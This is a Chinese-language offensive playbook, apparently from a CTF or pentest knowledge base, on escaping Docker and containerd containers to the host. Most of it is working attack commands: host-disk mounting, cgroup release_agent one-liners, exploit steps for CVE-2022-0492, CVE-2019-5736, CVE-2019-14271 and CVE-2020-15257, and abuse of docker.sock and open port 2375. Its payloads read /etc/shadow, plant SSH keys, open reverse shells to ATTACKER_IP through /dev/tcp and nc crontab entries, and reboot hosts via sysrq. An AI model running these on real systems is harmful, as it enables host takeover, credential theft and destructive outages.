---
category: cloud
tags: [docker, container, escape, privileged, cgroup, release_agent, docker_socket, runc, containerd, ctr, docker_api, cve-2019-5736, cve-2019-14271, cve-2020-15257, cve-2022-0492, 容器逃逸, 容器安全, docker提权, 特权容器]
triggers: [docker escape, container escape, privileged container, docker breakout, docker.sock, /var/run/docker.sock, release_agent, cgroup, runc, containerd, docker api, 2375, docker daemon, docker cp, shim-pwn, mount host, cap_sys_admin, nsenter, 容器逃逸, 特权容器, 容器提权, docker提权]
related: [cloud/kubernetes_enum, cloud/kubernetes_privesc]
---

# 容器逃逸 Container Escape

## 什么时候用

题目中出现 Docker、容器、`--privileged`、`docker.sock`、`cgroup`、`release_agent`、端口 2375/2376、`runc`、`containerd`、`--net=host`、`CAP_SYS_ADMIN` 等关键词时，应考虑容器逃逸。典型场景：

- 已获得容器内 root shell，需要逃逸到宿主机
- 发现暴露的 Docker API（端口 2375）
- 容器以 `--privileged` 或高权限 capability 运行
- 容器挂载了 `docker.sock` 或宿主机目录

## 前提条件

| 技术 | 最低要求 |
|------|----------|
| privileged 挂载逃逸 | 容器内 root + `--privileged` |
| cgroup release_agent | 容器内 root + 可写 cgroup v1（或内核 < 5.16.2 的 CVE-2022-0492） |
| Docker socket 利用 | 可访问 `/var/run/docker.sock` |
| Docker API 未授权 | 网络可达 2375 端口 |
| runC CVE-2019-5736 | 容器内 root + Docker ≤ 18.09.2 / runC ≤ 1.0-rc6 |
| docker cp CVE-2019-14271 | 宿主机管理员对恶意容器执行 `docker cp` + Docker 18.09.9–19.03.8 |
| Containerd CVE-2020-15257 | 容器以 `--net=host` 运行 + containerd < 1.3.9 / < 1.4.3 |
| ctr 提权 | 宿主机可执行 `ctr` 命令 |

## 检测容器环境

在尝试逃逸前，先确认自己是否在容器内：

```bash
# /.dockerenv 存在 → Docker 容器
ls -la /.dockerenv

# cgroup 信息包含 docker/kubepods → 容器内
cat /proc/1/cgroup | grep -E 'docker|kubepods|containerd'

# PID 1 不是 init/systemd → 可能在容器内
cat /proc/1/cmdline

# 文件系统检查
mount | grep -E 'overlay|aufs'
df -h | grep overlay

# 网络接口名称
ip link | grep -E 'eth0@|veth'

# hostname 通常是容器短 ID
hostname
```

检查容器的安全配置：

```bash
# 是否 privileged（无只读 cgroup 挂载 → privileged）
mount | grep '(ro' | grep -c cgroup
# 结果为 0 表示 privileged

# 检查 capabilities
cat /proc/1/status | grep -i cap
capsh --print 2>/dev/null

# 检查 Seccomp 状态（0 = 禁用）
grep Seccomp /proc/1/status

# 检查是否挂载了 docker.sock
ls -la /var/run/docker.sock 2>/dev/null
find / -name "docker.sock" 2>/dev/null

# 检查可用设备
ls /dev/ | wc -l
# 大量设备 → privileged
```

## 攻击步骤

### 1. Privileged 容器 — 挂载宿主机磁盘

容器以 `--privileged` 运行时，所有安全隔离（Seccomp、AppArmor、SELinux、capabilities 限制、只读 sysfs）均被禁用，可直接访问 `/dev/` 下所有设备。

```bash
# 找到宿主机磁盘
fdisk -l 2>/dev/null || lsblk

# 挂载宿主机根文件系统
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host

# 读取 /etc/shadow、写入 SSH 公钥等
cat /mnt/host/etc/shadow
echo 'your-ssh-pubkey' >> /mnt/host/root/.ssh/authorized_keys

# 或通过 chroot 获取完整宿主机 shell
chroot /mnt/host /bin/bash

# 反弹 shell：写入 crontab
echo '* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' \
  >> /mnt/host/etc/crontab
```

### 2. Cgroup release_agent 逃逸（经典）

利用 cgroup v1 的 `release_agent` 机制：当一个开启了 `notify_on_release=1` 的 cgroup 中最后一个进程退出时，内核会以宿主机 root 权限执行 `release_agent` 中指定的程序。

前提：容器内 root + `CAP_SYS_ADMIN` + cgroup v1 可写。

```bash
# 1. 挂载 cgroup
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

# 2. 启用 notify_on_release
echo 1 > /tmp/cgrp/x/notify_on_release

# 3. 获取容器在宿主机上的路径（upperdir）
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# 4. 写入 payload
cat <<'EOF' > /cmd
#!/bin/sh
cat /etc/hostname > /tmp/cgrp/output       # 读宿主机信息
ps aux >> /tmp/cgrp/output
EOF
chmod +x /cmd

# 5. 触发：添加进程到 cgroup 然后退出
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /tmp/cgrp/output
```

**一行版 PoC**：

```bash
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```

### 3. CVE-2022-0492 — 无 CAP_SYS_ADMIN 的 cgroup 逃逸

影响内核版本 < 5.16.2。内核未校验写入 `release_agent` 时的权限，容器进程可通过 `unshare` 创建新的 user/cgroup 命名空间来绕过。

条件：容器内 root + 无 AppArmor/SELinux/Seccomp + 宿主机启用非特权用户命名空间。

```bash
# 检测是否可利用
unshare -UrmC bash -c \
  'mkdir /tmp/t; mount -t cgroup -o rdma cgroup /tmp/t 2>/dev/null && \
   test -w /tmp/t/release_agent && echo "VULNERABLE" || echo "NOT VULN"'
```

完整利用：

```bash
# 进入新 user+cgroup namespace
unshare -UrmC bash

# 挂载 cgroup（使用 rdma 子系统，通常权限宽松）
mount -t cgroup -o rdma cgroup /mnt

# 后续步骤与经典 release_agent 逃逸一致
d=$(dirname $(ls -x /mnt/r* | head -n1))
mkdir -p $d/w; echo 1 > $d/w/notify_on_release
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

printf '#!/bin/bash\n/bin/bash -i >& /dev/tcp/ATTACKER_IP/9999 0>&1' > /exp.sh
chmod 777 /exp.sh
echo "$t/exp.sh" > $d/release_agent

sh -c "echo 0 > $d/w/cgroup.procs"
```

使用 CDK 工具：

```bash
./cdk run mount-cgroup "whoami" rdma
```

已修复内核：5.16.2, 5.15.17, 5.10.93, 5.4.176, 4.19.228, 4.14.265, 4.9.299 及更高版本。

### 4. Docker Socket 挂载利用

如果容器挂载了 `/var/run/docker.sock`，可通过 Docker API 控制宿主机上的 Docker daemon。

```bash
# 确认 docker.sock 可用
ls -la /var/run/docker.sock

# 方法 A：安装 docker CLI
apt update && apt install -y docker.io
# 或
curl -fsSL https://get.docker.com | sh

# 创建挂载宿主机根目录的新容器
docker run -v /:/host --privileged -it alpine chroot /host /bin/bash

# 方法 B：用 curl 调用 Docker API
# 列出容器
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | python3 -m json.tool

# 创建容器（挂载宿主机 /）
curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["sh"],"Mounts":[{"Type":"bind","Source":"/","Target":"/host"}],"Tty":true,"OpenStdin":true}'

# 启动并 attach
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/<ID>/start
```

### 5. Docker Daemon API 未授权（端口 2375）

Docker daemon 将 API 绑定到 `0.0.0.0:2375` 且无认证时，可远程完全控制。

```bash
# 验证：列出容器
curl http://TARGET:2375/containers/json

# 远程操控
docker -H tcp://TARGET:2375 images
docker -H tcp://TARGET:2375 ps -a

# 创建特权容器挂载宿主机
docker -H tcp://TARGET:2375 run -v /:/host --privileged -it alpine chroot /host /bin/bash

# 写入 SSH 公钥
docker -H tcp://TARGET:2375 run -v /root:/mnt alpine \
  sh -c 'echo "ssh-rsa AAAA..." >> /mnt/.ssh/authorized_keys'

# 通过 crontab 反弹 shell
docker -H tcp://TARGET:2375 run -v /etc:/tmp/etc alpine \
  sh -c "echo '* * * * * /usr/bin/nc ATTACKER_IP 4444 -e /bin/sh' >> /tmp/etc/crontabs/root"
```

Python 利用脚本：

```python
import docker
client = docker.DockerClient(base_url='http://TARGET:2375/')
data = client.containers.run(
    'alpine:latest',
    r'''sh -c "echo '* * * * * /usr/bin/nc ATTACKER_IP 4444 -e /bin/sh' >> /tmp/etc/crontabs/root"''',
    remove=True,
    volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}}
)
```

### 6. runC 覆盖逃逸 — CVE-2019-5736

影响版本：Docker ≤ 18.09.2 / runC ≤ 1.0-rc6。

原理：容器内将 `/bin/sh` 覆盖为 `#!/proc/self/exe`。当 `docker exec` 在容器中执行 `/bin/sh` 时，`/proc/self/exe` 指向宿主机的 `runc` 二进制。攻击者获取其文件句柄后，即可覆写宿主机上的 `runc`。

```go
// 编译 PoC — https://github.com/Frichetten/CVE-2019-5736-PoC
// 修改 payload 为反弹 shell
var payload = "#!/bin/bash \nbash -i >& /dev/tcp/ATTACKER_IP/9999 0>&1"

// 编译
// CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go
```

利用步骤：

```bash
# 1. 将编译好的 PoC 传入容器
docker cp ./main TARGET_CONTAINER:/main

# 2. 在容器内执行，覆盖 /bin/sh
docker exec -it TARGET_CONTAINER /bin/bash
./main
# [+] Overwritten /bin/sh successfully

# 3. 在另一个终端触发
docker exec -it TARGET_CONTAINER /bin/sh
# 此时 payload 执行，runc 被覆写

# 4. 下次任何 docker exec 都会以宿主机 root 执行 payload
```

⚠️ 此操作会破坏宿主机的 `runc`，后续所有容器操作都会受影响。

### 7. docker cp 逃逸 — CVE-2019-14271

影响版本：Docker 18.09.9 – 19.03.8。

原理：`docker cp` 命令使用 `docker-tar` 辅助进程，它会 chroot 到容器后动态加载 `libnss_*.so`。如果容器内放入恶意的 `libnss_files.so.2`，当管理员从容器外执行 `docker cp` 时，恶意库被加载并以宿主机 root 权限执行。

```bash
# 1. 在容器内替换 libnss_files.so.2
cp /exp/libnss_files.so.2 /lib/x86_64-linux-gnu/
chmod 777 /breakout
touch /logs     # 诱饵文件

# 2. 等待管理员执行
# docker cp CONTAINER:/logs ./    ← 触发逃逸

# 3. 恶意 .so 被加载后，宿主机文件系统挂载到容器 /host_fs
ls /host_fs
```

### 8. Containerd shim 逃逸 — CVE-2020-15257

影响版本：containerd < 1.3.9 / < 1.4.3。

条件：容器以 `--net=host` 运行，与宿主机共享 Network namespace。此时 `containerd-shim` 的抽象 Unix 域套接字暴露给容器进程。

```bash
# 确认可以访问 shim socket
cat /proc/net/unix | grep -a "containerd-shim"

# 使用 CDK 利用
./cdk run shim-pwn ATTACKER_IP 9999
```

⚠️ 使用 CDK v0.1.6，新版本可能触发 `connection refused`。

### 9. Containerd ctr 提权

如果在宿主机上有 `ctr` 命令的执行权限：

```bash
# 列出可用镜像
ctr image list

# 挂载宿主机根目录到容器
ctr run --mount type=bind,src=/,dst=/,options=rbind \
  -t registry:5000/ubuntu:latest pwned bash

# 或以 privileged 模式运行
ctr run --privileged --net-host \
  -t registry:5000/ubuntu:latest pwned bash
```

### 10. GCP 网络容器逃逸

条件：容器以 `--net=host` 运行 + 具有 `CAP_NET_ADMIN` 和 `CAP_NET_RAW`，在 GCE 实例上。

原理：GCE 的 Google Guest Agent 定期以明文 HTTP 轮询元数据服务（`169.254.169.254`）检查 SSH 公钥变更。攻击者利用 TCP 劫持（rshijack）伪造 IMDS 响应，注入恶意 SSH 公钥。

```bash
# 1. 监控到元数据服务器的流量
tcpdump -S -i eth0 'host 169.254.169.254 and port 80' &

# 2. 等待 Guest Agent 的 GET 请求，提取 SEQ/ACK/ETAG

# 3. 用 rshijack 注入伪造响应
fakeData.sh <ETAG> | rshijack -q eth0 169.254.169.254:80 \
  <LOCAL_IP>:<PORT> <TARGET_SEQ> <TARGET_ACK>

# 4. SSH 登录宿主机
ssh -i id_rsa -o StrictHostKeyChecking=no wouter@localhost
```

## 常见坑

- **cgroup 子系统选择**：`memory` 子系统可能权限不足，改用 `rdma` 或其他冷门子系统
- **`/etc/mtab` vs `/proc/mounts`**：某些容器内 `/etc/mtab` 不存在或不包含 `upperdir`，改用 `cat /proc/mounts | grep upperdir`
- **overlay2 路径**：`upperdir` 路径因 Docker 存储驱动不同而变化，`aufs` 用 `perdir`
- **Seccomp 阻止 unshare**：CVE-2022-0492 需要 Seccomp 被禁用才能调用 `unshare()`
- **AppArmor 阻止 mount**：默认 AppArmor 策略会拦截 `mount` 系统调用
- **runC PoC 是破坏性的**：CVE-2019-5736 会覆写宿主机 `runc`，一旦执行不可逆
- **cgroup v2 无 release_agent**：统一层级架构已移除此特性，release_agent 技术不适用
- **CDK 版本兼容**：CVE-2020-15257 利用推荐 CDK v0.1.6，新版本行为不同
- **非 privileged 但有 `CAP_SYS_ADMIN`**：可以通过 `--cap-add=SYS_ADMIN` 单独授予，不需要完整 `--privileged`

## 变体

| 变体 | 说明 |
|------|------|
| `--cap-add=SYS_ADMIN` 无 privileged | 仅有 SYS_ADMIN capability，仍可利用 cgroup/mount 类技术 |
| `--device=/dev/sda1` | 直接将宿主机磁盘设备映射到容器 |
| `--pid=host` | 共享 PID 命名空间，可 nsenter 进入宿主机进程 |
| `--net=host` | 共享网络命名空间，可嗅探/劫持宿主机流量 |
| Kubernetes Pod 逃逸 | Pod 的 `securityContext.privileged: true` 等同于 `--privileged` |
| Kata Containers / gVisor | 使用 VM 或用户态内核隔离，传统逃逸技术无效 |

### nsenter 提权（`--pid=host` 场景）

```bash
# 容器共享宿主机 PID 命名空间时
nsenter -t 1 -m -u -i -n -p -- /bin/bash
```

### 通过 procfs 逃逸（`/proc/sysrq-trigger`）

```bash
# privileged 容器中可通过 SysRq 重启宿主机（DoS）
echo b > /proc/sysrq-trigger

# 或通过 /proc/1/root 访问宿主机文件系统
ls /proc/1/root/
```

## 相关技术

- [[cloud/kubernetes_enum]] — Kubernetes 集群枚举，发现可逃逸的 Pod 配置
- [[cloud/kubernetes_privesc]] — Kubernetes 权限提升，创建特权 Pod 用于逃逸
